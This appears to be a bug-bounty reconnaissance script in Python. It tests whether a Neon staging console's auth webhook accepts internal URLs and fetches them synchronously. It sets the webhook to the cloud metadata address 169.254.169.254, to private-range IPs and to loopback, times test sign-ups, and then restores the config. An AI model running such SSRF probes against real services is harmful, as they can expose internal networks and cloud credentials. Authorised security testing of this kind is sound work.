# -*- coding: utf-8 -*-
"""W1: auth webhook SSRF reconnaissance (console-stage).
Q: does the auth webhook delivery backend accept arbitrary webhook_url (http, RFC1918,
cloud metadata) and fetch it synchronously? Signals:
  a) PUT accepts http://169.254.169.254 / 172.20.x.x URLs (no scheme/RFC1918 filter)
  b) sign-up latency delta when webhook target is a black hole vs reachable
Zero-destruction: webhook config restored afterwards; na_w* users are self-created
test users in our own auth directory; all traffic carries X-Bug-Bounty: xxbo.
"""
import json
import time
import ssl
import http.client

API_HOST = "console-stage.neon.build"
API_BASE = "/api/v2"
HB = {"X-Bug-Bounty": "xxbo"}
PA = "orange-sun-90493739"
PAMAIN = "br-wandering-field-w2ob6mpn"
NA_HOST = "ep-crimson-fog-w2gucld1.neonauth.us-east-2.aws.neon.build"
LOG = r"F:\scan\neon_report\_w1_out.txt"

with open(r"F:\scan\neon_report\_apikey.json", encoding="utf-8") as fh:
    APIKEY = json.load(fh)["key"]


def out(s):
    print(s, flush=True)
    with open(LOG, "a", encoding="utf-8") as fh:
        fh.write(s + "\n")


def call(method, path, body=None, timeout=40):
    ctx = ssl.create_default_context()
    conn = http.client.HTTPSConnection(API_HOST, timeout=timeout, context=ctx)
    payload = json.dumps(body) if body is not None else None
    hdrs = dict(HB, Authorization="Bearer " + APIKEY)
    if body is not None:
        hdrs["Content-Type"] = "application/json"
    conn.request(method, API_BASE + path, body=payload, headers=hdrs)
    resp = conn.getresponse()
    data = resp.read().decode("utf-8", "replace")
    conn.close()
    return resp.status, data


def na_req(method, path, body=None, timeout=30):
    ctx = ssl.create_default_context()
    conn = http.client.HTTPSConnection(NA_HOST, timeout=timeout, context=ctx)
    payload = json.dumps(body) if body is not None else None
    hdrs = {"Content-Type": "application/json", "Origin": "http://localhost:3000",
            "User-Agent": "Mozilla/5.0", "Accept": "application/json"}
    conn.request(method, path, body=payload, headers=hdrs)
    t0 = time.time()
    resp = conn.getresponse()
    data = resp.read().decode("utf-8", "replace")
    dt = time.time() - t0
    conn.close()
    return resp.status, data, dt


def set_webhook(url, events, timeout_s):
    body = {"enabled": True, "webhook_url": url,
            "enabled_events": events, "timeout_seconds": timeout_s}
    return call("PUT", "/projects/%s/branches/%s/auth/webhooks" % (PA, PAMAIN), body)


# ---- 0. baseline: current config + auth provider location ----
st, d = call("GET", "/projects/%s/branches/%s/auth/webhooks" % (PA, PAMAIN))
out("0 current webhook cfg: %s %s" % (st, d[:300]))
st, d = call("GET", "/projects/%s/branches/%s/auth" % (PA, PAMAIN))
out("0 auth cfg on main: %s %s" % (st, d[:200]))

# ---- 1. PUT with http + RFC1918 URL: filter check ----
out("\n=== 1 URL filter probes ===")
for url in ["http://169.254.169.254/latest/meta-data/",
            "https://169.254.169.254/",
            "http://172.20.0.1/",
            "http://10.0.0.1/",
            "http://127.0.0.1:80/"]:
    st, d = set_webhook(url, ["user.created"], 1)
    out("PUT webhook_url=%s -> %s %s" % (url, st, d[:220]))

# ---- 2. synchronous delivery timing (user.created on sign-up) ----
out("\n=== 2 sign-up latency vs webhook target ===")
probes = [
    ("A-reachable", "https://example.com/", "libobo1229+na_w1@gmail.com"),
    ("B-meta-http", "http://169.254.169.254/latest/meta-data/", "libobo1229+na_w2@gmail.com"),
    ("B2-meta-https", "https://169.254.169.254/latest/meta-data/", "libobo1229+na_w3@gmail.com"),
    ("C-rfc1918", "http://172.20.0.1/", "libobo1229+na_w4@gmail.com"),
    ("D-blackhole", "http://10.255.255.1:81/", "libobo1229+na_w5@gmail.com"),
]
for tag, url, email in probes:
    st, d = set_webhook(url, ["user.created"], 10)
    ok = st in (200, 201)
    out("%s PUT cfg: %s" % (tag, ok))
    if not ok:
        continue
    t0 = time.time()
    st2, d2, dt = na_req("POST", "/neondb/auth/sign-up/email",
                         {"email": email, "password": "SecTest!2026pass", "name": tag})
    out("%s sign-up %s -> %d | %.1fs | %s" % (tag, email, st2, dt, d2[:150]))
    if st2 not in (200, 201):
        # maybe already registered (rerun) - use sign-in as event-less control
        t0 = time.time()
        st3, d3, dt3 = na_req("POST", "/neondb/auth/sign-in/email",
                              {"email": email, "password": "SecTest!2026pass"})
        out("%s sign-in  %s -> %d | %.1fs | %s" % (tag, email, st3, dt3, d3[:120]))

# ---- 3. restore config (disable webhook) ----
st, d = set_webhook("https://example.com/", [], 5)
out("\n3 restore cfg: %s" % st)
out("== DONE")
